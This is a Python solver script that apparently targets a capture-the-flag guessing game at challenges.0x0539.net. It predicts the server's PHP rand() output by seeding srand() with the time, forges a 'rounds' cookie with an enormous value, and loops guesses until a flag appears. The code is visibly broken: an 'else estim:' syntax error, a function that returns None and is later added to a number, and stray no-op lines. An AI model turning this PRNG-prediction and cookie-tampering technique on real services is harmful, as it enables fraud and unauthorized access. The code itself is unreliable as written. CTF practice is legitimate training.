import subprocess
import requests
import datetime
import time
import re

while (time.time()-int(time.time())) > 0.0:
        pass

_Delay = 30
d = time.time()
r = requests.get('http://challenges.0x0539.net:3003/')

months = {	'Jan':'01',
		'Feb':'02',
		'Mar':'03',
		'Apr':'04',
		'May':'5',
		'Jun':'6' ,
		'Jul':'7',
		'Aug':'8',
		'Sep':'9',
		'Oct':'10',
		'Nov':'11',
		'Dec':'12'	
}
year = int(r.headers['Date'].split(', ')[1].split(' ')[2])
month = int(months[r.headers['Date'].split(', ')[1].split(' ')[1]])
day = int(r.headers['Date'].split(', ')[1].split(' ')[0])
ad = r.headers['Date'].split(', ')[1].split(' ')[3].split(':')
hour = int(ad[0])
minutes = int(ad[1])
secondes = int(ad[2])

now = datetime.datetime(year, month, day, hour, minutes, secondes)

print(f"This took: {time.time()-d} secondes")

cookie = r.cookies['PHPSESSID']

print("PHPSESSID", cookie)

_START_TIME = _Delay + int(d)

offset = int(now.timestamp()-int(d))-1  # int(now.timestamp()-int(d))

switch = False

def make_guess(guess, old_wrong):
        r2 = requests.post('http://challenges.0x0539.net:3003/', data={'guess':guess}, cookies={'rounds': '9223372036854775806', 'PHPSESSID': cookie})
        a = re.findall("Streak[:] \d+", r2.text)
        is_wrong  = 0 # init
        try:
                streak_out = a[0] if len(a) else re.findall("Streak[:] [-]\d+", r2.text)[0]
                streak = int(streak_out.split(': ')[1])
                Wrong = re.findall("Wrong[:] \d+", r2.text)[0]
                print(re.findall("Streak[:] \d+", r2.text)[0])
                print(streak_out)
                print(Wrong)
                is_wrong = int(Wrong.split(': ')[1]) - old_wrong
                print
                if streak < 0:
                        r2 = requests.post('http://challenges.0x0539.net:3003/', data={'reset':'Reset!'}, cookies={'PHPSESSID': cookie})
        except Exception as e:
                print(e)
                pass
        if "flag" in r2.text:
                print(r2.text)
                exit()
        return old_wrong, is_wrong

def try_guess(t):
        return int(subprocess.check_output(["php", "-r", f"srand({t});$rnd=rand();$rnd&=1;print_r($rnd);"], stderr=False, stdin=False,close_fds=False))

old_wrong = 0
nonce = 0

def calc_nonce(estim, attempts, current_attemt, nonce=0):
        if current_attemt:
                return
        if estim > 0.5:
                print("Bad connection, try using a vps!")
                exit()
        elif estim > 0.2:
                print("Bad Connection Use a vps..\nDo you wanna continue?")
                input()
        else estim:
                print("Good time estimation.")

        print("attempts:", attempts)
        print("estim", estim)
        (len(attempts))
        
        return nonce

_attempts = []

while 1:
        guess = int(time.time()+nonce)
        d = time.time()
        old_wrong, is_wrong = make_guess(try_guess(guess), old_wrong)
        estim = time.time()-d
        curr = 0
        if is_wrong:
                _attempts.append([0, estim])
        else:
                curr = 1
                _attempts.append([1, estim])
        nonce = calc_nonce(estim, _attempts, curr, nonce)
